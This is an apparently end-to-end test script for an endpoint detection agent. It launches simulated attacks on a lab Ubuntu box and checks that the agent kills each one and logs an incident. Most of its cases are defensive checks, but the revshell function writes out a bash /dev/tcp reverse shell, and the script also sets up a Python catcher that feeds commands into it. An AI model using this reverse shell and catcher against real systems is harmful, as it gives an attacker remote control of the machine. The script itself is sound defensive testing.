#!/bin/bash
# Live attacks against `xdr agent` on one real Ubuntu 24.04 box. The jump
# box is the attacker (the catcher listens there) and the scored client.
# Prints "ok <case>" or "FAIL <case>: why" and ends with E2E-DETECT PASS.
# Runs on the ssh backend; the box's own firewall is policy accept, so a
# reverse shell is stopped by killing it, never by a drop.
#   XDR_E2E_KILL=false  runs the agent with "kill": false (the run must fail)
#   XDR_E2E_KEEP=1      leaves the box as it is (until its dead-man timer)
set -uo pipefail
cd "$(dirname "$0")/../.."
XDR_E2E_BACKEND=${XDR_E2E_BACKEND:-ssh}
[ "$XDR_E2E_BACKEND" = ssh ] || { echo "e2e-detect runs on the ssh backend"; exit 1; }

KILL=${XDR_E2E_KILL:-true}
CONF=/etc/xdr/agent.json
BASE=/var/cache/xdr-e2e/base.json.gz
LOG=/var/lib/xdr/incidents.jsonl
# shellcheck source=test/vm/lib.sh
. test/vm/lib.sh
VM=${XDR_E2E_VM:-${BOXES[0]}}

OUT=$(mktemp -d)
CATCH=""
cleanup() {
  [ -n "$CATCH" ] && uncatch
  if [ "${XDR_E2E_KEEP:-}" != 1 ]; then boxes_down "$VM"; fi
  rm -rf "$OUT"
}
trap cleanup EXIT

boxes_up "$VM" || exit 1
HOST=$(jump_ip)
VMIP=$(ip_of "$VM")
echo "== jump box $HOST, box $VM $VMIP"

push bin/xdr /usr/local/sbin/xdr 0755 || exit 1
push test/vm/svc.py /usr/local/sbin/svc.py 0755 || exit 1
x mkdir -p /etc/xdr /var/cache/xdr-e2e
python3 - "$HOST" "$KILL" > "$OUT/agent.json" <<'PY'
import json, sys
host, kill = sys.argv[1], sys.argv[2] == "true"
print(json.dumps({
    "host": "e2e",
    "jump": [host],
    "scored": [{"proto": "tcp", "port": 80}],
    # Filled in from `xdr listeners` below, as an operator does.
    "listeners": [],
    "kill": kill,
}, indent=2))
PY
push "$OUT/agent.json" $CONF 0600 || exit 1
x systemd-run --unit=xdr-e2e-svc /usr/bin/python3 /usr/local/sbin/svc.py >/dev/null || exit 1
echo "== capture baseline"
x xdr capture --root / --out "$BASE" || exit 1
echo "== listeners before the agent (they go into the config)"
x xdr listeners --config "$CONF" > "$OUT/listeners.json" || exit 1
cat "$OUT/listeners.json"
python3 - "$OUT/agent.json" "$OUT/listeners.json" <<'PY' || exit 1
import json, sys
c = json.load(open(sys.argv[1]))
c["listeners"] = json.load(open(sys.argv[2]))
# sshd itself, for when it holds :22 after socket activation hands it over
c["listeners"].append({"proto": "tcp", "port": 22, "exe": "/usr/sbin/sshd"})
json.dump(c, open(sys.argv[1], "w"), indent=2)
PY
push "$OUT/agent.json" $CONF 0600 || exit 1

# http PATH: the status of the box's scored service, asked from the jump box.
http() { jb curl -s -o /dev/null -w '%{http_code}' --max-time "${2:-3}" "http://$VMIP$1"; true; }
scored() { [ "$(http /)" = 200 ] || fail scored-reachable "box:80 not 200 after $1"; }

# The catcher runs on the jump box: it accepts one connection on HOST:4444,
# appends what arrives to FILE, and sends whatever is written to FILE.send.
ssh -F "$SSHCFG" "$JUMP" "cat > $JROOT/catch.py" <<'PY'
import os, select, socket, sys
host, out = sys.argv[1], sys.argv[2]
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, 4444))
s.listen(1)
f = open(out, "ab", 0)
c, _ = s.accept()
f.write(b"accepted\n")
while True:
    if os.path.exists(out + ".send"):
        data = open(out + ".send", "rb").read()
        os.unlink(out + ".send")
        try:
            c.sendall(data)
        except OSError:
            break
    if select.select([c], [], [], 0.2)[0]:
        try:
            d = c.recv(4096)
        except OSError:
            break
        if not d:
            break
        f.write(d)
PY
# catch FILE: start the catcher; FILE is on the jump box.
catch() {
  jb rm -f "$1" "$1.send"
  jb touch "$1"
  jb systemd-run --unit=xdr-e2e-catch python3 "$JROOT/catch.py" "$HOST" "$1" >/dev/null
  CATCH=1
  sleep 0.7
}
uncatch() { jb systemctl stop xdr-e2e-catch >/dev/null 2>&1; jb systemctl reset-failed xdr-e2e-catch >/dev/null 2>&1; CATCH=""; }
accepted() { jb grep -q '^accepted' "$1" 2>/dev/null; }
send() { jb sh -c "printf '%s\n' '$2' > '$1.send'"; }
got() { jb grep -q "$2" "$1" 2>/dev/null; }
SHELL_RE="^bash -i\$|/dev/tcp/$HOST/4444"
revshell() { bg "bash -c 'bash -i >& /dev/tcp/$HOST/4444 0>&1'"; }

[ "$(http /)" = 200 ] && ok scored-reachable || fail scored-reachable "box:80 not 200 before the agent"

echo "== sensor-ebpf"
if start_agent && x grep -q '^sensor: ebpf$' "$ERR"; then ok sensor-ebpf
else fail sensor-ebpf "$(x cat "$ERR" | head -5)"; fi
scored sensor-ebpf

echo "== listener"
mark
bg "python3 -m http.server 4444"
if ! gone 4 'http.server 4444'; then fail listener "the server still runs"
elif ! wait_inc 2 listener killed; then fail listener "no listener/killed incident"
else ok listener; fi
scored listener

echo "== revshell"
mark
RS1=$JROOT/rs1
catch "$RS1"
revshell
# A base-image bash is a lead as egress; its stdio on the socket is the kill.
if ! gone 4 "$SHELL_RE"; then fail revshell "the shell still runs"
elif ! wait_inc 2 revshell-stdio killed "i.get('remote') == {'addr': '$HOST', 'port': 4444, 'proto': 'tcp'} and len(i.get('chain') or []) > 1"; then
  fail revshell "no revshell-stdio/killed incident with remote and chain: $(x tail -3 $LOG)"
else ok revshell; fi
uncatch
scored revshell

echo "== pre-existing-revshell"
stop_agent
x xdr fw remove
RS2=$JROOT/rs2
catch "$RS2"
revshell
for _ in $(seq 40); do accepted "$RS2" && break; sleep 0.25; done
send "$RS2" 'echo $((6*7))PRE'
for _ in $(seq 20); do got "$RS2" 42PRE && break; sleep 0.25; done
if ! got "$RS2" 42PRE; then
  fail pre-existing-revshell "the shell did not work without the agent: $(jb head -c 200 "$RS2")"
  start_agent
else
  mark
  start_agent
  if ! gone 5 "$SHELL_RE"; then fail pre-existing-revshell "the shell still runs"
  elif ! wait_inc 2 revshell-stdio killed; then fail pre-existing-revshell "no revshell-stdio/killed incident"
  else
    send "$RS2" 'echo $((6*7))AFTER'
    sleep 3
    if got "$RS2" 42AFTER; then fail pre-existing-revshell "the jump box still gets data"; else ok pre-existing-revshell; fi
  fi
fi
uncatch
scored pre-existing-revshell

echo "== service-shell"
mark
svc=$(x systemctl show -p MainPID --value xdr-e2e-svc)
code=$(http /run)
if [ "$code" != 200 ]; then fail service-shell "/run answered $code"
elif ! gone 3 'sleep 300'; then fail service-shell "the shell or its sleep still runs"
elif ! wait_inc 2 service-shell killed; then fail service-shell "no service-shell/killed incident"
elif [ "$(x systemctl show -p MainPID --value xdr-e2e-svc)" != "$svc" ]; then fail service-shell "svc.py was restarted or killed"
else ok service-shell; fi
scored service-shell

echo "== rawsock"
mark
bg "python3 -c 'import socket, time; s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); time.sleep(120)  # rawsock-e2e'"
if ! gone 3 rawsock-e2e; then fail rawsock "the raw-socket holder still runs"
elif ! wait_inc 2 rawsock killed; then fail rawsock "no rawsock/killed incident"
else ok rawsock; fi
scored rawsock

echo "== drift"
mark
x xdr fw remove
if ! wait_inc 6 fw-drift repaired; then fail drift "no fw-drift/repaired incident"
elif ! x nft list table inet xdr >/dev/null 2>&1; then fail drift "the table is not back"
else ok drift; fi
scored drift

echo "== foreign-nat"
mark
x nft add table ip sneaky
x nft add chain ip sneaky out '{ type nat hook output priority 0; }'
if wait_inc 6 fw-foreign alert "'ip sneaky/out' in i['detail']"; then ok foreign-nat
else fail foreign-nat "no fw-foreign incident for a nat chain after ours"; fi
x nft delete table ip sneaky
scored foreign-nat

echo "== agent-dead"
x systemctl kill -s KILL --kill-whom=main xdr-agent
sleep 1
before=$fails
x nft list table inet xdr >/dev/null 2>&1 || fail agent-dead "the table left with the agent"
[ "$(http /)" = 200 ] || fail agent-dead "box:80 not 200 with the agent dead"
[ $fails -eq $before ] && ok agent-dead
x systemctl reset-failed xdr-agent 2>/dev/null

echo "== fallback"
if ! start_agent --sensor proc || ! x grep -q '^sensor: proc$' "$ERR"; then
  fail fallback "no 'sensor: proc' line: $(x cat "$ERR" | head -5)"
else
  mark
  RS3=$JROOT/rs3
  catch "$RS3"
  revshell
  if ! gone 4 "$SHELL_RE"; then fail fallback "the shell still runs"
  elif ! wait_inc 2 revshell-stdio killed "i.get('remote', {}).get('port') == 4444"; then fail fallback "no revshell-stdio/killed incident"
  else ok fallback; fi
  uncatch
fi
scored fallback

echo "== incidents"
x xdr incidents --file "$LOG" > "$OUT/incidents.txt"; rc=$?
lines=$(x sh -c "wc -l < $LOG")
missing=""
for k in listener revshell-stdio service-shell rawsock fw-drift fw-foreign; do
  grep -q " $k " "$OUT/incidents.txt" || missing+=" $k"
done
if [ $rc -ne 0 ]; then fail incidents "exit $rc"
elif [ "$(wc -l < "$OUT/incidents.txt")" -ne "$lines" ]; then fail incidents "$(wc -l < "$OUT/incidents.txt") lines printed for $lines incidents"
elif [ -n "$missing" ]; then fail incidents "missing:$missing"
elif LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' "$OUT/incidents.txt"; then fail incidents "raw control bytes printed"
elif grep -E ' (listener|rawsock) .*/usr/lib/systemd/' "$OUT/incidents.txt"; then fail incidents "stock services listed by xdr listeners still raise alerts"
else ok incidents; fi

echo "== incident log"
cat "$OUT/incidents.txt"
echo "== agent stderr"
x sh -c 'tail -n 20 /var/log/xdr-agent.*.err'
stop_agent

if [ $fails -ne 0 ]; then
  echo "E2E-DETECT FAIL ($fails)"
  exit 1
fi
echo "E2E-DETECT PASS"
